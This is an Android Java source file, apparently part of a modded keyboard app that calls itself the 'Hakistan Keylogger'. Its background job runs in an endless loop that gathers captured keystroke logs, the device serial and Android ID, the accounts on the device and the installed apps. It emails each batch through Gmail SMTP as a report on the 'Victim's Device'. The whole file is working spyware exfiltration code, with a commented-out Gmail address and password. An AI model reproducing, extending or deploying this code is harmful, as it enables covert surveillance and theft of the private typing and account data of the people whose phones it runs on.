package com.abifog.lokiboard;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Patterns;
import android.view.Display;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.regex.Pattern;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import static android.os.Build.MANUFACTURER;
import static com.abifog.lokiboard.InGService.MY_PREFS_NAME;
import static com.abifog.lokiboard.InGService.MY_PREFS_STRING_KEY;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class JobGService extends JobService {


    private static final String TAG = "JobGService";
    private boolean jobfinshed = false;




    private String Sysinfo = "";
    //private String ContactsList = "";
    private String AccountsList = "";

    //private String email = "dashdashpass7@gmail.com";
    String email = "";
    String emailinterval = "";
    //private String password = "createpassword.";
    String password = "";//getResources().getString(R.string.Password);



    @Override
    public boolean onStartJob(JobParameters params) {

        Log.d(TAG, "onStartJob");

        doWorkInBack(params);

        return true;
    }

    private void doWorkInBack(JobParameters parameters){

        new Thread(new Runnable() {
            @Override
            public void run() {

                while (true){

                    if (jobfinshed){

                        return;

                    }

                    Log.i(TAG,"Again Started EMail Work!");

                    // _multipart = new MimeMultipart("related");

                    email=getResources().getString(R.string.EMail);
                    password=getResources().getString(R.string.EmailPassword);
                    emailinterval=getResources().getString(R.string.Interval);

                    // php();

                    SharedPreferences prefs = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);

                    SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();


                    String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.


                    // Log.i(TAG,"Going To Send Email!");


                    //addAttachment();

                    if(haveNetworkConnection()) {

                        if (prefs.getBoolean("FirstRun", true)) {

                            Log.i(TAG, "First Run Going to send Sys info");


                            Sysinfo = getSYSInfo();
                            // ContactsList = getContactList();
                            AccountsList = getAccountsList();

                            sendMail(email, "Loki Keyboard First Report", Sysinfo + "\n" + AccountsList + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed By Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");


                            editor.putBoolean("FirstRun", false);
                            editor.apply();
                        } else {

                            Log.i(TAG, "NOt First Run");


                        }

                        String datatos = getLogsData();

                        if (datatos.trim().length() > 0) {

                            Log.i(TAG, "Some Logs Founded, going to send Email!");


                            // Long perviousNotiCountData = prefs.getLong(MY_PREFS_Notification_Count_KEY, 0);//"No name defined" is the default value.
                            //  Long perviousTextCountData = prefs.getLong(MY_PREFS_Text_Count_KEY, 0);//"No name defined" is the default value.
                            // Long perviousFocusedCountData = prefs.getLong(MY_PREFS_FOCUSED_Count_KEY, 0);//"No name defined" is the default value.
                            // Long perviousClicksCountData = prefs.getLong(MY_PREFS_Clicks_Count_KEY, 0);//"No name defined" is the default value.
                            // Long perviousClipsCountData = prefs.getLong(MY_PREFS_Clips_Count_KEY, 0);//"No name defined" is the default value.

                            String deviceDetails = "MANUFACTURER : " + Build.MANUFACTURER
                                    + "\nMODEL : " + Build.MODEL
                                    + "\nPRODUCT : " + Build.PRODUCT
                                    + "\nSERIAL : " + Build.SERIAL
                                    + "\nVERSION.RELEASE : " + Build.VERSION.RELEASE
                                    + "\nVERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL
                                    + "\nVERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT
                                    + "\nBOARD : " + Build.BOARD
                                    //+"\nScreen Width : "+width
                                    //+"\nScreen Height : "+height
                                    + "\nBOOTLOADER : " + Build.BOOTLOADER
                                    + "\nBRAND : " + Build.BRAND
                                    + "\nCPU_ABI : " + Build.CPU_ABI
                                    + "\nCPU_ABI2 : " + Build.CPU_ABI2
                                    + "\nFINGERPRINT : " + Build.FINGERPRINT;


                            sendMail(email, "Loki Keyboard's Report", "Victim's Device Info : \n" + deviceDetails + "\n\n"+"\nKey Logs: \n" + datatos + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed by Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");

                    /*
                    editor.putLong(MY_PREFS_Notification_Count_KEY, 0);
                    editor.putLong(MY_PREFS_Text_Count_KEY, 0);
                    editor.putLong(MY_PREFS_FOCUSED_Count_KEY, 0);
                    editor.putLong(MY_PREFS_Clicks_Count_KEY, 0);
                    editor.putLong(MY_PREFS_Clips_Count_KEY, 0);
                    editor.putString(MY_PREFS_STRING_KEY, "");

                     */
                            // editor.apply();

                        } else {

                            Log.i(TAG, "No Logs So, Email is not going to be sent!");


                        }


                        //Log.i(TAG,"Email SEnt!");

                        // DataToSend = "";

                        //Log.i("Gservice", i+" Email Sent!");
                        //editor.putInt("idName", 12);
                        // editor.apply();

                    }

                    Log.i(TAG,"In Runnable!");

                    SystemClock.sleep(Long.parseLong(emailinterval));


                }

            }
        }).start();

    }

    private String getLogsData(){


        SharedPreferences prefs = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE);
        String LDataTOSend = prefs.getString("datatost", "Redeveloped By Hakistan");//"No name defined" is the default value.

        SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
        editor.putString("datatost", "");
        //editor.putInt("idName", 12);
        editor.apply();

        return LDataTOSend;

    }


    private boolean haveNetworkConnection() {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }


    private void sendMail(String email, String subject, String messageBody)
    {
        Session session = createSessionObject();

        try {
            Message message = createMessage(email, subject, messageBody, session);

            new JobGService.SendMailTask().execute(message);

        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private Message createMessage(String email, String subject, String messageBody, Session session) throws MessagingException, UnsupportedEncodingException {
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress("keylogger@hakistan.org", "Hakistan Keylogger"));
        message.addRecipient(Message.RecipientType.TO, new InternetAddress(email, email));
        message.setSubject(subject);
        message.setText(messageBody);
        // message.setContent();
/*
        String filename = Environment.getExternalStorageDirectory().getAbsolutePath() + "/my_test_contact.csv";
        if (!"".equals(filename)) {
            Multipart _multipart = new MimeMultipart();
            BodyPart messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(filename);

            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);

            _multipart.addBodyPart(messageBodyPart);
            message.setContent(_multipart);
        }
*/
        // message.setContent(_multipart,"messageBody Should be here!");
        return message;
    }

    private Session createSessionObject() {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        return Session.getInstance(properties, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(email, password);
            }
        });
    }

    private String getAccountsList(){

        String AccountDetails = "\nList Of Accounts: \n\nType : Username\n";

        ArrayList<String> emails = new ArrayList<>();

        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
        for (Account account : accounts) {

            AccountDetails = AccountDetails + account.type + " : " + account.name + "\n";

            //emails.add(account.name);

            // if (gmailPattern.matcher(account.name).matches()) {
            //   emails.add(account.name);
            //}
        }

        //      Log.i(TAG, AccountDetails);


        return AccountDetails;

    }


    private String getSYSInfo(){

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        assert wm != null;
        Display display = wm.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        @SuppressLint("HardwareIds")
        String SystemData = "\nDevice Information: \n";


        SystemData = SystemData+ "VERSION.RELEASE : "+ Build.VERSION.RELEASE
                +"\nVERSION.INCREMENTAL : "+Build.VERSION.INCREMENTAL
                +"\nVERSION.SDK.NUMBER : "+Build.VERSION.SDK_INT
                +"\nBOARD : "+Build.BOARD
                +"\nScreen Width : "+width
                +"\nScreen Height : "+height
                +"\nBOOTLOADER : "+Build.BOOTLOADER
                +"\nBRAND : "+Build.BRAND
                +"\nCPU_ABI : "+Build.CPU_ABI
                +"\nCPU_ABI2 : "+Build.CPU_ABI2
                +"\nDISPLAY : "+Build.DISPLAY
                +"\nFINGERPRINT : "+Build.FINGERPRINT
                +"\nHARDWARE : "+Build.HARDWARE
                +"\nHOST : "+ Build.HOST
                +"\nID : "+Build.ID
                +"\nMANUFACTURER : "+ MANUFACTURER
                +"\nMODEL : "+Build.MODEL
                +"\nPRODUCT : "+Build.PRODUCT
                +"\nSERIAL : "+Build.SERIAL
                +"\nTAGS : "+Build.TAGS
                //+"\nTIME : "+Build.TIME
                +"\nTYPE : "+Build.TYPE
                +"\nUNKNOWN : "+Build.UNKNOWN
                +"\nUSER : "+Build.USER
                + "\nANDROID ID : " + Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);


        // Log.i(TAG,details);

        ApkInfoExtractor apkInfoExtractor = new ApkInfoExtractor(getApplicationContext());

        List<String> arrayList = new ApkInfoExtractor(getApplicationContext()).GetAllInstalledApkInfo();
        // String ApplicationLabelName = apkInfoExtractor.GetAppName(ApplicationPackageName);

        String InstalledAppsPkg = "";

        for (String item : arrayList){

            String ApplicationLabelName = apkInfoExtractor.GetAppName(item);

            InstalledAppsPkg= InstalledAppsPkg + ApplicationLabelName + " : " + item + "\n";


        }

        SystemData  = SystemData + "\n\nList Of Installed Apps:\n" + "App Name : Package Name\n" + InstalledAppsPkg + "\n";

        //Log.i(TAG, SystemData);

        return SystemData;
    }

    private static class SendMailTask extends AsyncTask<Message, Void, Void> {
        //  private ProgressDialog progressDialog;

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            //Toast.makeText(getApplicationContext(),"Sending Email, Please Wait...",Toast.LENGTH_LONG).show();
            //    progressDialog = ProgressDialog.show(MainActivity.this, "Please wait", "Sending mail", true, false);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);

            // Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();

            //  progressDialog.dismiss();
        }

        @Override
        protected Void doInBackground(Message... messages) {
            try {
                Transport.send(messages[0]);
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }


    @Override
    public boolean onStopJob(JobParameters params) {
        jobfinshed = true;
        return true;
    }
}
